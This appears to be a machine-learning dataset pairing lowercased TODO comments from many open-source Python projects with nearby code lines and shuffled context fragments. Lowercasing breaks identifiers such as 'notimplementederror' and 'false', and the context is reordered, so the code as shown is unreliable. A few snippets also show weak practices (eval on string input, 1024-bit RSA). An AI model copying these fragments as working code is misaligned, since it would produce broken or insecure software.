'username': 'fakeuser@dimagi.com',  #todo </s> 'doc_id': uuid.uuid4().hex,	render_vscan_xform 'modified_date': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'user_id': 'f72265c0-362a-11e0-9e24-005056aa7fb5',  #TODO 'case_id': case_id, 'case_attachments': ''.join(case_attachments),
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# todo - need to parameterize this into generate_match_filters, </s> exact_match_filter = "(&(objectclass=person)%s)" % exact_match_filter	find_users (exact_match_filter, partial_match_filter) = generate_match_filters( search_fields, criteria_words) partial_match_filter = "(&(objectClass=person)%s)" % partial_match_filter try:
pass # todo </s> def handle_request(self, input):	handle_request
# todo(rlrossit): these look like dicts, but they're actually versioned </s> try:	_translate_floating_ip_view result['instance_id'] = None return {'floating_ip': result} if 'address' in floating_ip['fixed_ip']: result['fixed_ip'] = floating_ip['fixed_ip']['address']
# todo: uncomment report abuse gets ported to mkt. </s> raise skiptest	test_get def test_get(self): r = self.client.get(self.url) eq_(r.status_code, 200)
# todo: refactor this to be more uniform across sources </s> if not self.has_ui:	update_control_menu def update_control_menu(self): return self.update_menu()
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	ThreadedEchoServer self.daemon = True def __enter__(self): self.start(threading.Event()) self.flag.wait()
# todo(nnorwitz): enable test. </s> result)	testConstClassPointer self.assertEqual(Type('Bar', modifiers=modifiers, pointer=True),
raise exceptions.mpdnotimplemented  # todo </s> specify a sticker name, all sticker values are deleted.	sticker Deletes a sticker value from the specified object. If you do not
# todo: let the globe return the semimajor axis always. </s> a = np.float(self.globe.semimajor_axis or 6378137.0)	AzimuthalEquidistant ('x_0', false_easting), ('y_0', false_northing)] super(AzimuthalEquidistant, self).__init__(proj4_params, globe=globe) b = np.float(self.globe.semiminor_axis or a) coords = _ellipse_boundary(a * np.pi, b * np.pi,
# todo see issue 1935 </s> pass	autosave def autosave(self):
# todo - perhaps time_created could go here too? </s> return (self.cid, self.mid)	__key def __key(self):
# todo: let the globe return the semimajor axis always. </s> return coords	ellipse coords += ([easting], [northing])
# todo(sbauza): the current placement noauthmiddleware returns a 401 </s> headers = {'x-auth-token': self.token}	_fake_get def _fake_get(self, *args, **kwargs): (url,) = args[1:] self._update_headers_with_version(headers, **kwargs) return self._client.get(
# todo: pass fail_silently or whatever. </s> connection.send_messages(self._build_mails(self._watches()))	fire connection = mail.get_connection()
# todo: assert metrics. </s> metrics = code_analysis_server.metrics(	test_get_metrics error = repository.get_metrics(commit, metrics["spaces"]) assert not error "file.cpp", int i = 1;
# todo find a better way of checking for no pregenerated thresholds </s> self.code_gen_dict["$pragmas$"].append(	pragmas ) if self.calc_tmem() != 0: variable=threshs complete dim=1)""" )
# todo: show in-app notification? </s> print("device disconnected")	_on_device_removed _("Please make sure your device is supported and plugged in")) else:
# todo: should we enable auto-retry, </s> producer.publish(msg, exchange=exchange)	do_publish elif exchange is not None: maybe_declare(exchange, channel)
# todo(mordred) remove this, it's a waste of a call. it's here for </s> group = self._compute_client.get(	create_security_group 'name': name, 'description': description} }) '/os-security-groups/{id}'.format(id=group['id'])) return self._normalize_secgroup(group)
ndpi = (96, 96) # todo: read real dpi </s> debug_out("input dpi = %d x %d"%ndpi)	main debug_out("input dpi (forced) = %d x %d"%ndpi) else: if colorspace: color = colorspace
# todo: out to file </s> pass	write_up def write_up(self):
# now we can kill it. todo: on a slow machine, the node might kill </s> def _stop(res):	test_keygen d.addCallback(_started) d.addCallback(lambda res: self.poll(_node_has_started)) self.failUnless(os.path.exists(TWISTD_PID_FILE)) argv = ["--quiet", "stop", c1]
# todo: progress +kwargs </s> else:	pull GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): remote.pull(refspec=refspec, progress=progress) remote.pull(refspec=refspec, progress=progress)
"""todo: very inneficient code tag""" </s> nodes = hierarchicalnode.get_nodes_by_object(page)	show_menu @register.inclusion_tag('menu.html', takes_context=True) def show_menu(context, page, url='/'): if len(nodes) > 0: children = nodes[0].get_children_objects(page)
# todo: should this raise ioerror? </s> with raises(ioerror):	test_invalid_data_byte def test_invalid_data_byte(): read_file(HEADER_ONE_TRACK + """ 4d 54 72 6b  # MTrk
# todo: add for morph targets data. </s> count = len(indices)	extract_primitives joints.append(primitive['attributes']['JOINTS_' + str(bone_index)]) weights.append(primitive['attributes']['WEIGHTS_' + str(bone_index)]) if count == 0: continue
#todo: check the data! e.g. pubdate etc. </s> count = 0	test_loop_example pipe_def = self._get_pipe_def("pipe_dAI_R_FS3BG6fTKsAsqenA.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo pydocs </s> def __init__(self, service, project_id):	BigQueryBaseCursor class BigQueryBaseCursor(object): self.service = service self.project_id = project_id
# todo: test! </s> md5 = hashlib.md5()	get_hash def get_hash(file): for c in file.chunks(): md5.update(c)
# todo: replace with specific error when exceptions are refactored </s> raise xlwings.xlwingserror("getting or setting 'app.interactive' isn't supported on macos.")	App @property def interactive(self): @interactive.setter def interactive(self, value):
annot.annotation_metadata.annotation_rules = "todo" #todo </s> annot.annotation_metadata.validation_and_reliability = "todo" #todo	fill_annoatation_metadata annot.annotation_metadata.version = "1.0" annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.origin = "Epiphyte Corp" annot.annotation_metadata.annotator.name = "TODO"
# todo: this regex could change based on project req format </s> prefix = re.search("[a-za-z]+", id_text).group(0)	add_doorstop_items attributes[header_array[j]] = cell if row: req = id_text try:
# todo equip `unique()` with a tolerance </s> _, idx, inv = np.unique(pts, axis=0, return_index=true, return_inverse=true)	data_from_facets else: pts = np.concatenate(facets) k = np.argsort(idx) points = pts[idx[k]]
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
#todo - use a context manager here once we drop python 2.6 </s> self.assertraises(valueerror, clusterdistance, data,	test_clusterdistance c2 = [ 4, 5, 6, 7 ] c3 = [ 8 ] **{"mask": mask, "weight": weight, "index1": c1, "index2": c2,
# @todo need a py2/3 way to compare xml easily. </s> <duedate>2015-07-06 16:25:02.711136</duedate>	test_serializer_nested_singular <Type>ACCREC</Type>
# todo make comments clearer, see _viterbi_decode </s> broadcast_score = score.unsqueeze(2)	_compute_normalizer score = self.start_transitions.view(1, -1) + emissions[0] for i in range(1, seq_length): broadcast_emissions = emissions[i].unsqueeze(1)
# todo: use invalidation time </s> params: chat to dump, mediaid of the profile photo in the db	dump_chat def dump_chat(self, chat, photo_id): Returns -""" timestamp = round(time.time())
# todo-me move sorting and add more sorting options </s> aired_lst = sorted(child_lst, key=operator.itemgetter(1))	get_all_content else: pass play_lst = [x[0] for x in aired_lst] return play_lst
# todo: the problem was fixed in vobject 0.9.5 </s> raise vobjectbugexception(	getrruleset "failed to call getrruleset: %s" % e) from e if first_dtstart is None: "empty iterator from getrruleset") if (hasattr(child, "rrule") and
# todo: "wildcards" other than <any> </s> if type == "<any>" or type == term:	get_relations_by_arg1 continue for dummy, type in arg1s: rels.append(r) cache[directory] = rels
# todo: consider using eafp here instead. </s> if result is _not_found:	get result = _get_value(result, part) raise KeyNotFoundError(name, "missing %s" % repr(part)) return result
# todo: may want to validate its grouper </s> if require_agg:	grouped_eval grouped_res = call(__data) if isinstance(grouped_res, GroupByAgg): return grouped_res else:
# todo: re-enable for hardware </s> if 'stack' not in interfaces_config[portno]:	add_dp peer_portno = stack['port'] peer_dpid, _ = dpname_to_dpkey[peer_dp] interfaces_config[portno]['stack'] = {} interfaces_config[portno]['stack'].update({
# todo: is this behavior desired? </s> self.library.browse.return_value.get.side_effect = exception	test_browse_backend_browse_uri_exception_gets_through def test_browse_backend_browse_uri_exception_gets_through(self, logger): with self.assertRaises(Exception): self.core.library.browse('dummy:directory')
# todo: test filter functionality more </s> f = multistagechannelfilter(input_rate=8000000, output_rate=48000, cutoff_freq=10000, transition_width=5000)	test_decimating def test_decimating(self): self.__run(f, 400000, 48000 / 8000000)
# todo notify orgadmin </s> elif all(tags[k] == "approved" for k in review):	facility_approval_workflow update["PUBLIC"] = "N" update["STATUS"] = "REVISE" update["PUBLIC"] = "Y" update["STATUS"] = "APPROVED"
# todo(laigd): remove this check when 312743821 is in the release. </s> if use_tf_function and tf.compat.v1.__version__ < '2.3.0':	CallDefunTestParameters def CallDefunTestParameters(test_fn): def WrappedTestFn(self, use_tf_function, bak_as_function): return FLAGS.call_defun_use_tf_function = use_tf_function
return  # todo: handle images </s> style = stylizer.style(html_child)	process_inline tag = barename(html_child.tag) if tag == 'img': if html_child.text: docx_block.add_text(html_child.text, style)
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
# todo: explicitly commit files by name </s> youngest_ancestor = os.path.commonprefix(files)	add raise IOError("[BZR] add in '%s' failed: %s" \ % (self.location_abs, error)) return output + type(self)(youngest_ancestor).commit(message, author)
# todo improve precision </s> warnings.warn("the cohen-gismalla schemes are only given in single-precision.")	__init__ def __init__(self): self.name = "CohenGismalla(2)" self.degree = 1
# todo: overwrite databus values with function in this class </s> self.power[2] = databus.get_value("register_1082")	initialize self.power[1] = databus.get_value("register_1081")
#todo todo todo todo todo todo todo todo todo </s> pub_key.generate_key(crypto.type_rsa, 1024)	gen_RSA_key :rtype: An RSA key as an `pyopenssl.OpenSSL.crypto.PKey` pub_key = crypto.PKey() return pub_key
return cursor_offset, line #todo not implemented </s> def yank_prev_prev_killed_text(cursor_offset, line):	yank_prev_prev_killed_text @on('\x1by')
# todo: account for point size </s> data = []	Point3DBox super(Point3DBox, self).process_option(name, value) def to_json(self): face_color = self.face_color if list(face_color.to_rgba()[:3]) == [1,1,1]:
# todo remove hardcoded path </s> with open('c:/users/sofie/documents/data/wikipedia/prior_prob.csv', mode='w', encoding='utf8') as outputfile:	_read_wikipedia_prior_probs line = file.readline() cnt += 1 outputfile.write("alias" + "|" + "count" + "|" + "entity" + "\n") for alias, alias_dict in sorted(map_alias_to_link.items(), key=lambda x: x[0]):
raise notimplementederror # todo </s> elif style == 'pyformat':	_format_request for i,value in enumerate(parameters)]) elif style == 'format': raise NotImplementedError # TODO else:
# todo(mordred) add this back wnen ksa releases </s> self.assertnotin('links', host['flavor'])	_test_host_content self.assertEqual(host['image']['id'], self.image.id) self.assertNotIn('links', host['image']) self.assertNotIn('links', host) self.assertIsInstance(host['volumes'], list)
# todo: follow `references` to add reference information here </s> snl = structurenl(	_get_snls_from_resource ) namespaced_data = {k: v for k, v in data.items() if k.startswith("_")} structure, authors={},
# todo: could chain of 'source' with the spid </s> source_str = src.path	_PrintWithLocation source_str = src.path elif isinstance(src, source__SourcedFile): elif isinstance(src, source__Alias): source_str = '[ expansion of alias %r ]' % src.argv0
# todo(b/160795287): deprecate estimator based executor. </s> fn_args_dict = fn_args.get_dict()	run_fn fn_args: Holds args used to train the model as name/value pairs. schema = io_utils.parse_pbtxt_file(fn_args.schema_file, schema_pb2.Schema()) fn_args_dict['serving_model_dir'] = os.path.join(fn_args.model_run_dir, path_utils.SERVING_MODEL_DIR)
# todo: add more complicated testcases </s> assert_equal(score.shape, (4,))	test_aom_dynamic_repeat random_state=42)
# todo: test! </s> if not settings.st_unique_emails:	EmailUniqueMixin def clean_email(self): email = self.cleaned_data["email"] return email is_taken = User._default_manager\
gle = [-1, -1, -1]  # todo calculate based on mesh </s> gre = [1, 1, 1]  # todo calculate based on mesh	_parse_index domain_dimension = self.dataset.domain_dimensions num_grids = int(np.ceil(count * self.vpg ** -1)) particle_count = np.linspace(0, count, num_grids + 1, dtype=np.int32) particle_names = []
# todo docstring </s> pass	transform def transform():
# (which seems a bit odd - todo - check with ncbi?) </s> extra = extra.difference(["-num_threads"])	check "-xdrop_gap", "-xdrop_gap_final"]) if exe_name in ["rpsblast", "rpstblastn"]: if exe_name in ["tblastn", "tblastx"]: extra = extra.difference(["-db_soft_mask"])
# todo: possibly emit an onscenechanged event </s> setscenelighting(self.scene)	_sceneChanged from glmodule import setSceneLighting
# todo: refactor to compose a list and join with ';', would be more clean. </s> commands = initial_command.rstrip("; ")	__init__ def __init__(self, initial_command): self.commands = commands self.return_code_captured = False
# todo: once/if we have gpu and language labels then we might be </s> filters = {"label": ["_orchest_project_uuid"]}	clear_environment_images This is to avoid the issue of having environments with mismatching Orchest SDK versions. for img in docker_client.images.list(filters=filters): docker_client.images.remove(img.id)
# todo: fix test </s> if (sys.version_info.major, sys.version_info.minor) in [(3, 4), (3, 5), (3, 6)]:	test_update_rec_exec_arg assert caplog.records[-1].levelname == 'DEBUG' except IndexError as e: print('caplog records: {}'.format(caplog.records)) for idx, record in enumerate(caplog.records):
# todo: need to close computations on this node? </s> node.clusters.clear()	run_job (DispyJob.Cancelled, dispy_node, njob.job))) node.pending_jobs = [] self._nodes.pop(node.ip_addr, None) if self._sched_jobs.pop(_job.uid, None) == _job:
# todo: really need crs specified properly in agdc-metadata.yaml </s> if projection['datum'] == 'gda94':	_dataset_projection def _dataset_projection(dataset): projection = dataset.metadata_doc['grid_spatial']['projection'] return {'init': 'EPSG:283' + str(abs(projection['zone']))} if projection['datum'] == 'WGS84':
@unittest.skip('not written')  # todo: finish! </s> self.assert_shortened([value], "[b'aaaaaaaaaaaaaaaaaa...aaaaaaaaa']")	test_bytes_large "b'" + 'A' * 43688 + "..." + 'A' * 21844 + "'")
# todo: deprecate `extra_info` in favor of `options` </s> if 'extra_info' in kwargs:	get_posts if 'pages' in kwargs: kwargs['page_limit'] = kwargs.pop('pages') kwargs.pop('extra_info') options.add('reactions')
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# todo: test </s> old_len = hpat.distributed_api.local_len(b)	_series_dropna_str_alloc_impl def _series_dropna_str_alloc_impl(B):  # pragma: no cover new_len = old_len - hpat.hiframes.api.init_series(B).isna().sum() num_chars = hpat.str_arr_ext.num_total_chars(B)
# todo(aarontp): remove hard-coded sudo in commands: </s> mount_cmd = ['sudo', 'mount', evidence.local_path, evidence.mount_path]	PreprocessMountDisk mount_prefix, e)) evidence.mount_path = tempfile.mkdtemp(prefix='turbinia', dir=mount_prefix) log.info('Running: {0:s}'.format(' '.join(mount_cmd))) try:
# todo(dspasovski): fix this. </s> raise skiptest	test_sidebar def test_sidebar(self): r = self.client.get(self.url) a = pq(r.content)('#category-facets .selected a')
# todo: infer kernel arguments </s> [callkernel(kernel_name=new_kernel_name)] +	inner_mapper new_kernel_name = kernel_name_gen() new_schedule.extend( current_chunk + [ReturnFromKernel(kernel_name=new_kernel_name)])
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_circle_draw @requires_application() def test_circle_draw(): raise SkipTest with TestingCanvas() as c:
# todo: test </s> return val	bcast_scalar def bcast_scalar(val):  # pragma: no cover
# @todo: make this configurable </s> location_level = "l3"	vulnerability_resilience This is run async within vulnerability_update_aggregates Where appropriate add test cases to modules/unit_tests/s3db/vulnerability.py db = current.db s3db = current.s3db
# todo(piyush): current api-site doesn't contain this api description. </s> uri = '/agents/%s/l3-routers' % agent_id	add_router_to_l3_agent def add_router_to_l3_agent(self, agent_id, **kwargs): return self.create_resource(uri, kwargs)
#todo: popen2("dot -tpng | display") and actually make the graph window pop up </s> def print_for_dot(self):	print_for_dot print "digraph unix { size = '6,6'; node [color = lightblue2; style = filled];" for op in self.order:
# todo(remove this when 11.6.1 is no longer supported) </s> tmos_v = self._meta_data['bigip']._meta_data['tmos_version']	create def create(self, **kwargs): tmos_v = LooseVersion(tmos_v) if tmos_v < LooseVersion('11.6.0'):
# todo: uncomment when adding support for literal hex bytes </s> print(bytearray(b'hello world   ').islower())	test_islower print(bytearray(b'hello world').islower())
# todo: we can't do this; this shells out for each selection change... </s> valid_actions.add('push')	get_valid_actions valid_actions.add('compare') valid_actions.add('update') if all(s not in (STATE_NONE, STATE_IGNORED) for s in states): valid_actions.add('commit')
#todo: check system tables instead of using cql thrifteries </s> ks_info = con.con.client.describe_keyspace(model._get_keyspace())	create_table create_keyspace(model._get_keyspace()) with connection_manager() as con: if not any([raw_cf_name == cf.name for cf in ks_info.cf_defs]): qs = ['CREATE TABLE {}'.format(cf_name)]
# todo, pass also best score </s> if last_path is not none and not self.trainer.testing:	__recover_child_process_weights if self.trainer.checkpoint_callback: self.trainer.checkpoint_callback.best_model_path = best_path ckpt = torch.load(last_path, map_location=lambda storage, loc: storage) model.load_state_dict(ckpt)
# todo: handle parser errors. </s> for event, node in xml.dom.pulldom.parsestring(data):	detect_asx_header if not data or b'asx' not in data: return False if event == xml.dom.pulldom.START_ELEMENT: return node.tagName == 'asx'
raise notimplementederror # todo </s> def em_step(self):	EM_step
node_list = ursula.batch_from_bytes(nodes, federated_only=self.federated_only)  # todo: 466 </s> new_nodes = []	learn_from_teacher_node signature, nodes = signature_splitter(response.content, return_remainder=True) from nucypher.characters.lawful import Ursula for node in node_list: if node.checksum_public_address in self.known_nodes or node.checksum_public_address == self.checksum_public_address:
# todo remove after v0.19 </s> if lock is not none:	open_dataset lock=None, ): warnings.warn( "The kwarg 'lock' has been deprecated for this backend, and is now "
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, labels=none, axis=0, index=none, columns=none,	drop_overload def drop_overload(df, labels=None, axis=0, index=None, columns=None, level=None, inplace=False, errors='raise'): level=None, inplace=False, errors='raise'): return hpat.hiframes.pd_dataframe_ext.drop_dummy(
# todo: totally not in vim </s> region = sublime.region(offset, offset + length)	apply_patches length = patch[1] patch_text = patch[2] regions.append(region) self.MODIFIED_EVENTS.put(1)
# todo: check error location </s> assert result.errors[0].message == sync_error.message	test_nulls_a_nullable_field_that_throws_sync result = execute(schema, ThrowingData(), ast, 'Q', {}) assert len(result.errors) == 1 assert result.data == { 'sync': None
# todo: this can be formulated more efficiently </s> sqrt_ggn = einsum('boc->cbo', (sqrt_ggn_out, )).contiguous()	backpropagate_sqrt_ggn num_classes = sqrt_ggn_out.size(2) assert tuple(sqrt_ggn_out.size())[:2] == (batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, channels, out_x * out_y)
# todo: toots with only html do not display (images, links) </s> content = "  " + re.sub('<[^<]+?>', '', toot['content'])	public clean = re.sub('<[^<]+?>', '', toot['reblog']['content']) content = username + display_name + clean print(content + "\n")
self.whitelist.add(user_id) # todo: fix passing ints to file.write() </s> write_file('blacklist.txt', self.whitelist)	MusicBot if not user_id: raise CommandError('Invalid user specified') async def handle_id(self, author): Usage: {command_prefix}id
# compare filesizes todo print analysis of this :) </s> cmd = "ls -l '%s.ttf'*" % filename	ttx_process cmd = "ttx -i '%s.ttx'" % filename run(cmd, cwd=_out, log=log) run(cmd, cwd=_out, log=log) cmd = "rm  '%s.ttf.orig'" % filename
# todo: backwards compatibility; remove in favor of class method </s> return type(self).__calibration_file_name(calibration)	_calibration_file_name def _calibration_file_name(self, calibration):
# todo: for now the memory-server will be booted when jupyter </s> store_dir_mount = mount(	launch_pipeline type='bind' ) target='/tmp', source=pipeline_dir,
# todo: reinstate </s> assert 'class="field_error"' in res, res	test_edit_bad_name assert 'class="form-errors"' in res, res
# todo: implement </s> if self.turn == white:	pop def pop(self): move = self.move_stack.pop() self.ply -= 1 self.half_moves = self.half_move_stack.pop()
#todo: check the data! </s> count = 0	test_tail pipe_def = self._get_pipe_def("pipe_06c4c44316efb0f5f16e4e7fa4589ba2.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo: need to test this logic </s> if index in field:	split index = Vbc.index cmpt = Vbc.component if len(field) == 1: W = V
'user_id': 'f72265c0-362a-11e0-9e24-005056aa7fb5',  #todo </s> 'username': 'fakeuser@dimagi.com',  #todo	render_xform 'time_end': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'modified_date': datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'doc_id': uuid.uuid4().hex, 'case_id': uuid.uuid4().hex,
# todo: also check for already-existing path. </s> click.echo("importing checkpoint... ", nl=false)	download shutil.copyfileobj(response.raw, f) click.echo('done.') output = os.path.join(LUMINOTH_PATH, CHECKPOINT_PATH, checkpoint['id']) with tarfile.open(path) as f:
# todo: see issue #944 </s> return self._profile_output(args)	apply for i in self.yk_solns.values(): i.post_apply()
# todo: actually tests mismatchs, this only ensures the code-path is run </s> self._reader(self.traj, refresh_offsets=true)	test_reload_offsets def test_reload_offsets(self):
# todo(pts): move reused /encoding dicts to separate objects. </s> obj_nums = copy_encoding_dict.get(fd_obj_num)	OptimizeType1CFonts if obj_nums is None: obj_nums = copy_encoding_dict[fd_obj_num] = [None, []]
# todo remove this eventually </s> self.should_remove_duplicates = false	ImportTask self.candidates = [] self.rec = None self.is_album = True def set_choice(self, choice):
# todo figure out something useful to do with the newbranch param </s> return super(hgrepo, self).pull(remote, heads, force)	pull else: #pragma: no cover
return # ::todo:: </s> b=self.db.backup("main", db2, "main")	testBackup self.assertDbIdentical(self.db, db2) self.db.cursor().execute("drop table a") try: while not b.done:
gc.collect()  # todo: see first comment above </s> assert_not_in(path1, dataset._unique_instances.keys())	test_Dataset_flyweight with swallow_logs(new_level=1) as cml: del ds3 eq_([], [o for o in gc.get_objects() if isinstance(o, Dataset) and o.path == path1])
# todo ditto </s> form_type_pattern = '([a-z]+)'	setup domain_code_pattern = '([a-z]+)' form_type_lengths.sort()
# todo fix. </s> self.assertequals(reil_ctx_out["rax"], res)	test_movq_2 res = 0x1234567812345678 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["mm0"], ctx_init["mm0"])
# todo: proper java error? </s> raise runtimeerror("could not find method %d in object %s by id." % (method_id, obj.value.jvm_name))	call_int_method_v method = obj.value.__class__.find_method_by_id(method_id) if method is None: logger.debug("JNIEnv->CallIntMethodV(%s, %s <%s>, 0x%x) was called" % ( obj.value.jvm_name,
# todo - actually figure out types </s> return [{	xlsx_infer_schema sheet = book.get_active_sheet() headers = sheet.iter_rows().next() 'column': h.internal_value, 'type': 'unicode'
# todo: check if we can use orm to do that </s> sub_query = """	categories_with_contents_count @staticmethod def categories_with_contents_count(handle_types): SELECT COUNT(*) FROM `tutorialv2_publishedcontent` INNER JOIN `tutorialv2_publishablecontent`
# todo: renaming function paramters </s> self.assertequals("new_var = 'a b c'\nnew_var.split('\\n')\n", refactored)	test_renaming_names_when_getting_some_attribute2 refactored = self.refactoring.rename("a_var = 'a b c'\na_var.split('\\n')\n", 20, 'new_var')
pass  ## fixme: todo </s> else:	_book if has_self_reduction(group_postings): pass  ## FIXME: TODO
# todo: add this to simulator_objects </s> pop.input_signal.name = name + '.input'	make_input self.model.encoder(self.simtime, pop, weights=np.asarray([[1]])) self.inputs[name] = pop.output_signal pop.bias_signal.name = name + '.bias' pop.output_signal.name = name + '.output'
# todo: fix to avoid the implementation depended on the order of dict implicitly </s> placeholder: value for placeholder, value in zip(metrics_placeholders, metrics_values)	evaluate metrics_values = sess.run(list(metrics_ops_dict.values())) metrics_feed_dict = { } metrics_summary, = sess.run(
# todo: support the <base> html element, but do not use </s> href = urljoin(element.base_url, element.get('href'))	find_stylesheets elif element.tag == 'link' and element.get('href') \ and ' stylesheet ' in ' %s ' % element.get('rel', ''): yield parseUrl(href, media=media_attr, title=element.get('title'))
# todo: something a bit less heavy than eval </s> terms = eval(terms)	run if isinstance(terms, basestring): if '{' or '[' in terms: terms = [ terms ] return flatten(terms)
# todo: move this to sublime_lib; make it accept a point or a region. </s> def geteol(view, point):	getEOL return view.line(point).end()
# todo assert input entity is not none to avoid weird errors </s> self._chat = self._client.get_entity(self.input_chat)	chat def chat(self): if self._chat is None: return self._chat
# todo this should be more modular </s> if 'bindings' in response:	_get_targets if 'items' in response: targets += response['items'] targets += response['bindings'] if 'accounts' in response:
el_movieposter.set('onselect', "atv.loadurl('"+el_path+"')")  # todo: 'select' - show metadata </s> el_movieposter.set('onplay', "atv.loadurl('"+el_path+"')")	XML_TVShow_ListView el_moviePoster.set('id', 'shelf_item_'+str(aTV_shelf_item)) aTV_shelf_item += 1 el = etree.SubElement(el_moviePoster, 'label') el.text = i.get('title')
# todo: raise description error if 2 values not provided </s> name, value = value.split('|')	get_render form_class = ' '+ value if key in ['button','submit','hidden','reset']: inputs.append({'name':namify(name),'value':value,'type':key}) if key == 'toggle_fields':
raise skiptest("buggy")  # todo(mattjj): fix </s> p = onp.arange(15).reshape((5, 3)) % 4 == 1	testSelect def testSelect(self): f = onp.zeros((5, 3)) def fun(t):
# todo: think of something more sensible to do than sum(). on one </s> return sum([msq(p, t) for p, t in pairs])	MeanSquaredError else: pairs = izip(prediction, target)
#@todo: move to utils in 0.4.10 </s> def decode(string, encoding=none):	decode if type(string) is str: try:
# todo should we pass? </s> pass	WeatherCache except sqlite3.Error as err: _log.debug("Unable to open the sqlite database for caching: ?", err) self.sqlite_cursor = self.sqlite_conn.cursor() try:
# todo: date problem here </s> for city, data in values_for_date.items():	merge_state_data for date, values_for_date in new_cases.items(): date_str = f"{date.day:02d}_{date.month:02d}" city_info = get_city_info(city, state) if city_info:
# todo: we need a clean consistent way to get the type of a cap string </s> if cap.startswith("uri:chk") or cap.startswith("uri:ssk"):	render_row ctx.fillSlots("path", self.slashify_path(path)) root = get_root(ctx) nameurl = urllib.quote(path[-1].encode("utf-8")) uri_link = "%s/file/%s/@@named=/%s" % (root, urllib.quote(cap),
pass # todo </s> def handle_request(self, input):	handle_request
# todo complete this method </s> partition, kptlist, dtype)	eeccsd return ipccsd(eom, nroots, koopmans, guess, left, eris, imds,
# todo: implement this. </s> pass	test_get_key def test_get_key(self):
# todo: if the procpool has been exhausted this will block. </s> self.procpool.spawn(self.handle_request, body)	on_nova_message def on_nova_message(self, body, message): with self.messagesem: message.ack()
# todo: remove in v8 </s> if not isinstance(self.config['deploy_commands'], dict):	__init__ if self.config['BASE_URL'] and self.config['BASE_URL'][-1] != '/': utils.LOGGER.warn("Your BASE_URL doesn't end in / -- adding it, but please fix it in your config file!") utils.LOGGER.warn("A single list as DEPLOY_COMMANDS is deprecated.  DEPLOY_COMMANDS should be a dict, with deploy preset names as keys and lists of commands as values.") utils.LOGGER.warn("The key `default` is used by `nikola deploy`:")
# todo deal with other types </s> self.attrs[attribute_name] = dynamotype({"s": new_value})	update_with_attribute_updates new_value = update_action['Value'].values()[0] if action == 'PUT':
# todo(py3.7): add required=true </s> return bytes.fromhex(arg)	hex_bytes def hex_bytes(arg):
# todo test </s> def state(network):	state current_state, past_state = network.current_state, network.past_state tpm = network.tpm
# todo: untested </s> self._model.load_state_dict(torch.load(path))	from_disk def from_disk(self, path):
# todo: clarify language here. </s> s = ("the supplied identity is %(cid)s, the server is at %(serv)s,"	fetchAndParse if status is consumer.SUCCESS: identity_info = IdentityInfo(consu, *info) " identity at the server is %(sid)s" % { 'cid': identity_info.consumer_id,
@unittest.skip('not written')  # todo: finish! </s> raise notimplementederror	test_bytearray_small def test_bytearray_small(self):
# todo timeout? </s> pass	xcp_command_discovery can_wrap.send_single_message_with_callback(connect_message, connect_callback_handler) while not connect_reply: cmd_msg = [cmd_code, 0, 0, 0, 0, 0, 0, 0] def callback_handler(msg):
# todo: temporary! remove me once profiling is supported for v2 </s> if not hasattr(klio_transforms, "kliobasedofn"):	_get_transforms "transforms", KlioPipeline.TRANSFORMS_PATH ) logging.error("Profiling V2 klio jobs is not yet available.") raise SystemExit(1)
# todo; not sure what's wrong here. possible bug? </s> @pytest.mark.xfail	test_matcher_match_zero def test_matcher_match_zero(matcher): words1 = 'He said , " some words " ...'.split()
# todo: return a list of chapters to download </s> raise not_implemented	get_range_using_urls def get_range_using_urls(self, crawler):
# todo implement through browser </s> step_message = 'accept alert'	accept_alert def accept_alert(): execution.logger.info(step_message) _capture_or_add_step(step_message, execution.settings['screenshot_on_step'])
# todo private access </s> yield func_execution._arguments	_check_name_for_execution if compare_node == value_node: for func_execution in create_func_excs(value): elif isinstance(value.parent_context, FunctionExecutionContext) and \ compare_node.type == 'funcdef':
# todo: for now we use fake eth1 monitor. </s> pass	configure_parser arg_parser: ArgumentParser, subparser: _SubParsersAction) -> None:
# todo: handle fancy-index copies by allocating a buffer and </s> return tuple(	_fallback_next def _fallback_next(self, next_index): fn(data[next_index]) if fn else data[next_index] for data, fn in safe_izip(self._raw_data, self._convert)
# todo you should put some extra protection on this, so a user can only </s> revoke = request.json.get('revoke', none)	revoke_jwt @app.route('/auth/tokens/<string:jti>', methods=['PUT']) def revoke_jwt(jti): if revoke is None: return jsonify({'msg': "Missing json argument: 'revoke'"}), 422
# todo: some way of indicating progress. </s> click.echo(	download_remote_checkpoint tempdir = tempfile.mkdtemp() path = os.path.join(tempdir, '{}.tar'.format(checkpoint['id'])) "Downloading checkpoint '{}'... ".format(checkpoint['id']), nl=False
# todo: cleanup directory/basename.* files. </s> tmp = tempfile.namedtemporaryfile(	write_library data['version'] = mopidy.__version__ directory, basename = os.path.split(json_file) prefix=basename + '.', dir=directory, delete=False) try:
# todo: support steps and times (motion blur) </s> print("dupli export took %.3fs" % (time() - start))	create_session transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations) engine.update_progress(index / len_objs)
# todo: add option to only show error runs </s> run = request.db.get_run(run_id)	get_all @nav.active_section('runs') def get_all(self, run_id): return { 'run': run,
